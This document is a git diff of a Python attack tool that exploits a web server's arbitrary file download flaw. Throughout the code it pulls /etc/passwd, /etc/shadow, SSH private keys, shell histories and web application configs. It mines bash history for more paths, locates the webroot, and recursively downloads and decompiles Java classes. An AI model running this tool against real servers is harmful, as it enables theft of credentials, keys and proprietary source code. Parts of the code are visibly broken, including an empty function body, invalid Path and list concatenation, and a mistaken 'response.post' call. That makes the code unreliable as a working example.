@@ -6,197 +6,28 @@ import time
 import subprocess
 from pathlib import Path
 
-home_directory_files = [
-    ".bashrc",
-    ".bash_profile",
-    ".bash_logout",
-    ".profile",
-    ".bash_history",
-    ".zshrc",
-    ".zsh_history",
-    ".vimrc",
-    ".viminfo",
-    ".tmux.conf",
-    ".gitconfig",
-    ".gitignore_global",
-    ".mysql_history",
-    ".dist.history"
-    
-    ".ssh/",
-    ".ssh/id_rsa",
-    ".ssh/id_rsa.pub",
-    ".ssh/id_ecdsa",
-    ".ssh/id_ecdsa.pub",
-    ".ssh/id_ed25519",
-    ".ssh/id_ed25519.pub",
-    ".ssh/authorized_keys",
-    ".ssh/known_hosts",
-    ".ssh/config",
-    
-    ".zhistory",
-    ".history",
-    ".sh_history",
-    ".nano_history",
-    ".sqlite_history",
+from dictionary import (
+    home_directory_files,
+    system_file,
+    targets,
+    webTarget,
+    file_extensions,
+)
 
-    ".xsession",
-    ".xinitrc",
-    ".xprofile",
-    ".Xresources",
-]
-
-system_file = [
-
-    [
-        "/etc/nginx/nginx.conf",
-        "/etc/nginx/conf.d/default.conf",
-        "/etc/nginx/mime.types",
-        "/etc/nginx/fastcgi_params",
-        "/etc/nginx/fastcgi_params.default",
-        "/etc/nginx/fastcgi.conf",
-        "/etc/nginx/fastcgi.conf.default",
-        "/etc/nginx/forceRestart.sh",
-        "/etc/nginx/win-utf",
-        "/etc/nginx/scgi_params",
-        "/etc/nginx/fastcgi_params",
-        "/etc/nginx/nginx.host"
-        "/etc/nginx/scgi_params.default",
-        "/etc/nginx/uwsgi_params.default",
-        "/etc/nginx/uwsgi_params",
-        "/etc/nginx/mime.types.default",
-        "/etc/nginx/html/index.html",
-        "/etc/nginx/html/50x.html",
-        "/usr/share/nginx/html/index.html",
-        "/usr/share/nginx/html/50x.html",
-        "/var/www/html/index.html",
-        "/var/www/html/index.nginx-debian.html",
-    ],
-
-    [
-        "/etc/hosts",
-        "/etc/hostname",
-        "/etc/crontab",
-        "/etc/resolv.conf",
-        "/etc/host.conf",
-        "/etc/ssh/sshd_config",
-        "/etc/ssh/ssh_config",
-        "/etc/apache2/apache2.conf",
-        "/etc/mysql/my.cnf",
-        "/etc/passwd",
-        "/etc/passwd-",
-        "/etc/shadow-",
-        "/etc/shadow",
-        "/etc/sysctl.conf",
-        "/etc/bash.bashrc",
-        "/etc/fstab",
-        "/etc/rsyslog.conf",
-        "/etc/services",
-        "/etc/modules",
-        "/etc/environment",
-        "/etc/protocols",
-        "/etc/hosts.allow",
-        "/etc/hosts.deny",
-        "/etc/httpd/conf/httpd.conf",
-        "/etc/httpd/conf/magic",
-        "/etc/httpd/conf/conf.d",
-        "/etc/httpd/conf/autoindex.conf",
-        "/etc/httpd/conf/README",
-        "/etc/httpd/conf/userdir.conf",
-        "/etc/ntp.conf",
-        "/etc/ntp/crypto",
-        "/etc/ntp/keys",
-        "/etc/ntp/step-tickers",
-        "/etc/os-release",
-        "/etc/centos-release",
-        "/etc/redhat-release",
-        "/etc/pam.d/other",
-        "/etc/pam.d/system-auth",
-        "/etc/pam.d/password-auth",
-        "/etc/pam.d/common-auth",
-        "/etc/pam.d/common-account",
-        "/etc/pam.d/common-password",
-        "/etc/pam.d/common-session",
-        "/etc/pam.d/chfn",
-        "/etc/pam.d/chsh",
-        "/etc/pam.d/config-util",
-        "/etc/pam.d/crond",
-        "/etc/pam.d/fingerprint-auth",
-        "/etc/pam.d/fingerprint-auth-ac",
-        "/etc/pam.d/login",
-        "/etc/pam.d/passwd",
-        "/etc/pam.d/password-auth-ac",
-        "/etc/pam.d/postlogin",
-        "/etc/pam.d/su",
-        "/etc/pam.d/sudo",
-        "/etc/pam.d/sudo-i",
-        "/etc/pam.d/su-l",
-        "/etc/pam.d/smtp",
-        "/etc/pam.d/sshd",
-        "/etc/pam.d/systemd-user",
-        "/etc/pam.d/ppp",
-        "/etc/pam.d/common-auth",
-        "/etc/pam.d/common-password",
-
-
-    ],
-
-    [
-        "/proc/self/maps",
-        "/proc/self/cmdline",
-        "/proc/self/exe",
-        "/proc/self/cwd/maps",
-        "/proc/self/environ",
-        "/proc/self/net/tcp",
-        "/proc/self/net/udp",
-        "/proc/self/net/arp",
-        "/proc/self/comm",
-        "/proc/self/syscall",
-        "/proc/self/loginuid",
-
-    ],
-
-    [
-        "/var/log/nginx/error.log",
-        "/var/log/nginx/access.log",
-        "/var/log/cron",
-        "/var/log/dmesg",
-        "/var/log/secure",
-        "/var/log/yum.log",
-        "/var/log/lastlog",
-        "/var/log/wtmp",
-        "/var/log/utmp",
-        "/var/log/btmp",
-        "/var/log/tallylog",
-
-    ],
-
-    [
-        "/usr/lib/x86_64-linux-gnu/libc.so.6",
-        "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
-    ]
-]
-
-targets = ( "cat /", "vi /", "vim /", "nano /", "touch /", )
-
-webTarget = ["WEB-INF", "web-inf", "webroot", "WebRoot", "webroots", "WebRoots", "WEB-INF/web.xml", "WEB-INF/classes", "application.properties", "application.yml", "application.yaml", "system.xml", "jdbc.xml", "web.xml", "Web.config", "Web.Config", "php.ini", "bootstrap.properties", "bootstrap.yml", "database.properties", "jdbc.properties", "config.properties", "configuration.properties", "root-context.xml", "server.xml", "context.xml", "tomcat-users.xml", "context-database.xml", "context-property.xml", "servlet-context.xml", "context-security.xml", "context-exception.xml", "JeusServer.log", "jeus8", "security.properties", "domain.xml", "bxm-application.xml", "com/"]
-
-file_extensions = (
-        'log', 'xml', 'class', 'properties', 'yml', 'yaml', 
-        'conf', 'config', 'jsp', 'php', 'html', 'htm', 
-        'js', 'css', 'txt', 'json', 'sql', 'db', 'bak', 
-        'war', 'jar', 'sh', 'py', 'rb', 'java', 'cpp', 'c', 'h',
-        'md', 'pdf', 'doc', 'docx', 'xls', 'xlsx'
-    )
+BASE_DIR = Path.cwd() / "extract"
+BASE_DIR.mkdir(parents=True, exist_ok=True)
 
 downloaded_file = []
-attempt_file = []
 homeDir = ""
+downloaded_class_list = []
+WebRoot = [] # ex) /storage/webapps/test/site
+
+# 다운로드 실패 시 0바이트가 아닌 문구 등 바이트 반환될때 고정 값 넣어주기
+download_Fail_byte = b""
 
 # class_file extract
 IMPORT_PATTERN = re.compile(r"^import com")
 PACKAGE_PATTERN = re.compile(r"^package com")
-
-downloaded_class_list = []
 
 def extract_account(passwd: Path) -> None:
     global homeDir
@@ -213,9 +44,7 @@ def extract_account(passwd: Path) -> None:
                     bHistory = fields[5] + "/.bash_history"
 
                 bash_history = download_File(bHistory)
-                if bash_history == b"":
-                    continue
-                elif bash_history != b"":
+                if bash_history and (not download_Fail_byte or download_Fail_byte not in bash_history):
                     print("WAS was executed by " + account)
                     if fields[5] == "/":
                         homeDir = home
@@ -223,14 +52,11 @@ def extract_account(passwd: Path) -> None:
                         homeDir = home + "/"
                     mkFile(bash_history, bHistory)
 
-
 def mkFile(fileContent: bytes, filePath: str):
-    base_dir = Path(__file__).parent / "extract"
-    save_path = base_dir / filePath.lstrip("/")
+    save_path = BASE_DIR / filePath.lstrip("/")
     save_path.parent.mkdir(parents=True, exist_ok=True)
     save_path.write_bytes(fileContent)
     print("File Extract : " + str(save_path))
-
 
 def download_HomeFile():
     for file in home_directory_files:
@@ -239,9 +65,7 @@ def download_HomeFile():
         else:
             path = homeDir + file
         result = download_File(path)
-        if result == b"":
-            continue
-        elif result != b"":
+        if result and (not download_Fail_byte or download_Fail_byte not in result):
             mkFile(result, path)
 
 def download_SystemFile():
@@ -249,17 +73,13 @@ def download_SystemFile():
         for file in file_list:
             path = file
             result = download_File(path)
-            if result == b"":
-                continue
-            elif result != b"":
+            if result and (not download_Fail_byte or download_Fail_byte not in result):
                 mkFile(result, path)
 
 def download_File(path: str) -> bytes:
     
     if path in downloaded_file:
         return b""
-    else:
-        downloaded_file.append(path)
 
     # print(path)
     # return b"success Download"
@@ -276,7 +96,8 @@ def download_File(path: str) -> bytes:
             "Cookies": "JESSIONS"
         }
         response = requests.get(url=targetUrl_GET, params=params)
-        time.sleep(0.2)
+        downloaded_file.append(path)
+        time.sleep(0.5)
         if len(response.content) == 0:
             return b""
         else:
@@ -293,69 +114,78 @@ def download_File(path: str) -> bytes:
             "Cookies": "JESSION"
         }
         response.post(url=targetUrl_POST, data=data)
-        time.sleep(0.2)
+        downloaded_file.append(path)
+        time.sleep(0.5)
         if len(response.content) == 0:
             return b""
         else:
             return response.content
-        
+
+
+def find_WebRoot(line: str):
+    matches = re.findall(r'(/[\w/.-]+)', line)
+    for file_path in matches:
+        path = Path(file_path)
+        if "WEB-INF" in path.parts:
+            parts = path.parts
+            web_inf_index = parts.index("WEB-INF")
+            web_root = str(Path(*parts[:web_inf_index]))
+            if web_root not in WebRoot:
+                WebRoot.append(web_root)
+                print("find WEBROOT : " + web_root)
+
+
+def extract_web_xml():
+
 
 def solve_Bash_History():
-    path = ""
-    with open("." + homeDir + ".bash_history", "r") as f:
+    with open(BASE_DIR + homeDir + ".bash_history", "r") as f:
         for line in f:
 
-            # if line.startswith("cd /"):
-            #     path = line.strip().split(" ", 1)[1]
+            find_WebRoot(line)
 
-            if any(word in line for word in webTarget):
-                print("Detect Line : " + line)
-                matches = re.findall(r'(/[\w/.-]+)', line)
-                for file_path in matches:
-                    if file_path.endswith('/'):
-                        continue
-                    print("Download : " + file_path)
-                    result = download_File(file_path)
-                    if result and result != b"":
-                        mkFile(result, file_path)
-                    else:
-                        print("Download failed or 0 byte: " + file_path)
-            
+            # cd, vi, vim, nano, touch 로 시작하는 인자 중 절대경로 다운로드
+            if line.startswith(targets):
+                for target in targets:
+                    if line.startswith(target):
+                        file_path = line[len(target):].strip()
+                        result = download_File(file_path)
+                        if result and (not download_Fail_byte or download_Fail_byte not in result):
+                            mkFile(result, file_path)
 
+            # tail 인자 중 절대경로  다운로드
             elif line.startswith("tail "):
                 match = re.search(r'tail\s+.*?(/[\w/.-]+)', line)
                 if match:
                     file_path = match.group(1)
                     result = download_File(file_path)
-                    if result == b"":
-                        continue
-                    elif result != b"":
+                    if result and (not download_Fail_byte or download_Fail_byte not in result):
                         mkFile(result, file_path)
 
-            elif line.startswith(targets):
-                for target in targets:
-                    if line.startswith(target):
-                        file_path = line[len(target)-1:]
-                        result = download_File(file_path)
-                        if result == b"":
-                            continue
-                        elif result != b"":
-                            mkFile(result, file_path)
-
+            # webTarget 들어간 라인 추출
+            elif any(word in line for word in webTarget):
+                print("webTarget Detect Line : " + line)
+                # 절대경로인 애들 리스트 형태 추출
+                matches = re.findall(r'(/[\w/.-]+)', line)
+                for file_path in matches:
+                    # 마지막에 / 있으면 스킵
+                    if file_path.endswith('/'):
+                        continue
+                    result = download_File(file_path)
+                    if result and (not download_Fail_byte or download_Fail_byte not in result):
+                        mkFile(result, file_path)
+            
+            # 즉시 실행 절대경로 파일 다운로드 ex) /opt/tomcat/test/catalina.sh
             else:
-                matches = re.findall(r'(\.?/[\w/.-]+(?:\.\w+)?)', line) 
-                if matches: 
-                    for file_path in matches:
-                        filename = file_path.split('/')[-1]
-
-                        if (file_path.endswith('/') or not filename or filename == '/' or '.' not in filename):        
-                            continue
-                        result = download_File(file_path)
-                        if result and result != b"":
-                            mkFile(result, file_path)
-
-
-
+                matches = re.findall(r'(\.?/[\w/.-]+)', line)
+                for file_path in matches:
+                    path_obj = Path(file_path)
+                    filename = path_obj.name
+                    if file_path.endswith('/') or not filename or filename == '/':
+                        continue
+                    result = download_File(file_path)
+                    if result and (not download_Fail_byte or download_Fail_byte not in result):
+                        mkFile(result, file_path)
     
 def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
     if not cfr_path.is_file():
@@ -406,10 +236,10 @@ def extract_class(decompile_class: str) -> list[str]:
     return classPath_list
 
 # if you want POST method "targetUrl_GET = ''"
-def download_classes(classPath_list: list[str]):
+def download_java_classes(classPath_list: list[str]):
     targetUrl_GET = ""
     targetUrl_POST = ""
-    WEBROOT = "WEBROOT/classes/"
+    WEBROOT = WebRoot + "/WEB-INF/classes/"
     if targetUrl_GET:
         for classPath in classPath_list:
             
@@ -447,7 +277,7 @@ def download_classes(classPath_list: list[str]):
                 f.write(response.content)
                 print("extract class : " + className)
             time.sleep(1)
-            download_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
+            download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
 
     elif targetUrl_POST:
         for file_name in classPath_list:
@@ -481,7 +311,7 @@ def download_classes(classPath_list: list[str]):
                 f.write(response.content)
                 print("extract class : " + className)
             time.sleep(1)
-            download_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
+            download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
 
 def main():
     parser = argparse.ArgumentParser(
@@ -496,16 +326,25 @@ def main():
         extract_account(Path(args.passwd))
         download_HomeFile()
         download_SystemFile()
-        solve_Bash_History()
+        if homeDir != "":
+            solve_Bash_History()
+            extract_web_xml()
+        else:
+            print("Not Found .bash_history...")
+            # 추가 예정
+
     else:
         print("[*] No passwd file provide...")
     
+    # passwd와 병합 예정
     if args.class_file:
         print("extract class file via seed .class ...")
         downloaded_class_list.append(args.class_file)
         classPath_list = cfr_decompile(Path("./cfr-0.152.jar"), Path(args.class_file))
-        download_classes(classPath_list)
+        download_java_classes(classPath_list)
         print("Extract Class\n" + str(downloaded_class_list))
+    else:
+        print("[*] No .class file provide...")
     
 if __name__ == "__main__":
     main()
